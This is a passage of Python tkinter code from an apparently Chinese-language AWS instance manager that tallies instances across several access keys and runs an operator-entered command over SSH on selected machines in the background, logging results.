        ip_instances = 0
        non_ip_instances = 0
        cpu_low = 0

        for item in self.tree.get_children():
            values = self.tree.item(item, "values")
            ip_address = values[1]
            cpu_usage = values[6]

            if ip_address and ip_address != "":
                ip_instances += 1
            else:
                non_ip_instances += 1

            if cpu_usage and cpu_usage not in ("N/A", ""):
                try:
                    cpu_usage_value = float(str(cpu_usage).replace('%', '').strip())
                    if cpu_usage_value < 50.0:
                        cpu_low += 1
                except ValueError:
                    continue

        account_count = len(self.aws_keys_set)
        self.stats_info.config(text=f"账号: {account_count} 实例: {total_instances} 有IP: {ip_instances} 没IP: {non_ip_instances} CPU低于50%: {cpu_low}")

    def pause_task(self):
        self.is_paused = True

    def resume_task(self):
        self.is_paused = False

    def select_all(self):
        for item in self.tree.get_children():
            self.tree.selection_add(item)

    def deselect_all(self):
        for item in self.tree.get_children():
            self.tree.selection_remove(item)

    def execute_ssh_commands(self):
        selected_items = self.tree.selection()

        if not selected_items:
            messagebox.showwarning("警告", "请选择至少一个实例进行 SSH 命令执行。")
            return

        ssh_command = self.ssh_command_entry.get().strip()
        if not ssh_command:
            messagebox.showwarning("警告", "请输入SSH命令。")
            return

        # 重置并初始化 SSH 汇总统计
        with self.ssh_summary_lock:
            self.ssh_summary = {"total": len(selected_items), "success": 0, "fail": 0, "failures": []}
            self.ssh_summary_pending = len(selected_items)

        self.root.after(0, self.log_box.insert, tk.END, f"开始对 {len(selected_items)} 个实例提交 SSH 命令...\n")
        self.root.after(0, self.log_box.yview_moveto, 1)

        # 提交任务并用回调统计结果
        for item in selected_items:
            instance_id = self.tree.item(item, "values")[0]
            ip_address = self.tree.item(item, "values")[1]
            username = self.tree.item(item, "values")[4]
            password = self.tree.item(item, "values")[5]

            if not ip_address:
                # 立即记录失败原因（没有公网 IP）
                self.root.after(0, self.log_box.insert, tk.END, f"[{instance_id}] 无公网 IP，跳过执行。\n")
                with self.ssh_summary_lock:
                    self.ssh_summary["fail"] += 1
                    self.ssh_summary["failures"].append((instance_id, "无公网 IP"))
                    self.ssh_summary_pending -= 1
                    if self.ssh_summary_pending == 0:
                        self.root.after(0, self._log_ssh_summary)
                continue

            # 找到对应 aws_keys
            aws_keys = None
            for inst in self.instance_data:
                if inst["Instance ID"] == instance_id:
                    aws_keys = inst["AWS Key"]
                    break
            if not aws_keys:
                self.root.after(0, self.log_box.insert, tk.END, f"实例 {instance_id} 找不到对应 AWS Key，跳过执行。\n")
                with self.ssh_summary_lock:
                    self.ssh_summary["fail"] += 1
                    self.ssh_summary["failures"].append((instance_id, "无法找到对应 AWS Key"))
                    self.ssh_summary_pending -= 1
                    if self.ssh_summary_pending == 0:
                        self.root.after(0, self._log_ssh_summary)
                continue

            # 提交到线程池并添加完成回调
            future = pool_2.submit(self._run_ssh_command_in_thread, instance_id, ip_address, username, password, ssh_command, aws_keys)
            future.add_done_callback(lambda fut, iid=instance_id: self._ssh_done_callback(fut, iid))

    def _ssh_done_callback(self, fut, instance_id):
        try:
            result = fut.result(timeout=0)
            # result 应为 (instance_id, success_bool, error_msg_or_None)
            iid, success, errmsg = result
        except Exception as e:
            iid = instance_id
            success = False
            errmsg = str(e)

        with self.ssh_summary_lock:
            if success:
                self.ssh_summary["success"] += 1
            else:
                self.ssh_summary["fail"] += 1
                self.ssh_summary["failures"].append((iid, errmsg))
            self.ssh_summary_pending -= 1
            if self.ssh_summary_pending <= 0:
                # 所有任务完成，回主线程打印总结
                self.root.after(0, self._log_ssh_summary)

    def _log_ssh_summary(self):
        s = self.ssh_summary
        summary_lines = []
        summary_lines.append("\nSSH 执行结果统计：\n")
        summary_lines.append(f"共提交 {s['total']} 个实例\n")
        summary_lines.append(f"成功 {s['success']} 个\n")
        summary_lines.append(f"失败 {s['fail']} 个\n")
        if s['fail'] > 0:
            summary_lines.append("---- 失败明细 ----\n")
            for inst_id, reason in s['failures']:
                summary_lines.append(f"{inst_id} | {reason}\n")
        summary_lines.append("\n")

        # 写入 GUI 日志
        for line in summary_lines:
            self.log_box.insert(tk.END, line)
        self.log_box.yview_moveto(1)

        # 写入批量 SSH 日志文件
        with open(self.ssh_log_file, "a", encoding="utf-8") as f:
            f.writelines(summary_lines)


    def _run_ssh_command_in_thread(self, instance_id, ip_address, username, password, ssh_command, aws_keys):
        ssh = None
        try:
            # 尝试 SSH 连接（可用你的 connect_with_fallback 方法）
            ssh, conn_info = self.connect_with_fallback(ip_address, username, password)
            if not ssh:
                msg = "SSH连接失败"
                with open(self.ssh_log_file, "a", encoding="utf-8") as f:
                    f.write(f"[{instance_id}] {msg}\n")
                return (instance_id, False, msg)

            # 🔹 改进后的远程执行命令
            background_command = (
                f"nohup bash -c 'echo \"==== $(date +%F_%T) 开始执行 ====\" >> /root/ssh_task_{instance_id}.log && "
                f"{ssh_command} >> /root/ssh_task_{instance_id}.log 2>&1 && "
                f"echo \"==== $(date +%F_%T) 执行完成 ====\" >> /root/ssh_task_{instance_id}.log' &"
            )
            # GUI 日志
            self.root.after(0, self.log_box.insert, tk.END, f"[{instance_id}] 后台提交任务: {ssh_command}\n")
            self.root.after(0, self.log_box.yview_moveto, 1)
            
            # 写入批量 SSH 日志文件
            with open(self.ssh_log_file, "a", encoding="utf-8") as f:
                f.write(f"[{instance_id}] 后台提交任务: {ssh_command}\n")

            # 执行命令
            ssh.exec_command(background_command)
            ssh.close()

            # GUI 日志显示任务提交成功
            self.root.after(0, self.log_box.insert, tk.END, f"[{instance_id}] 任务已提交后台执行 ✅\n")
            self.root.after(0, self.log_box.yview_moveto, 1)

            # 写入批量 SSH 日志文件
            with open(self.ssh_log_file, "a", encoding="utf-8") as f:
                f.write(f"[{instance_id}] 任务已提交后台执行 ✅\n")

            return (instance_id, True, None)

        except Exception as e:
            # GUI 日志显示错误
            self.root.after(0, self.log_box.insert, tk.END, f"[{instance_id}] SSH执行失败: {e}\n")
            self.root.after(0, self.log_box.yview_moveto, 1)

            # 写入批量 SSH 日志文件
            with open(self.ssh_log_file, "a", encoding="utf-8") as f:
                f.write(f"[{instance_id}] SSH执行失败: {e}\n")

            return (instance_id, False, str(e))

        finally:
            if ssh:
                try:
                    ssh.close()
                except Exception:
                    pass

    def log_ssh_output(self, instance_id, output, error=False):
        message = f"实例 {instance_id} 执行命令输出: {output}\n"
        if error:
            message = f"实例 {instance_id} 执行命令错误: {output}\n"
        self.root.after(0, self.log_box.insert, tk.END, message)
        self.root.after(0, self.log_box.yview_moveto, 1)


# 创建主窗口
root = tk.Tk()
app = AWSManagerApp(root)
root.mainloop()

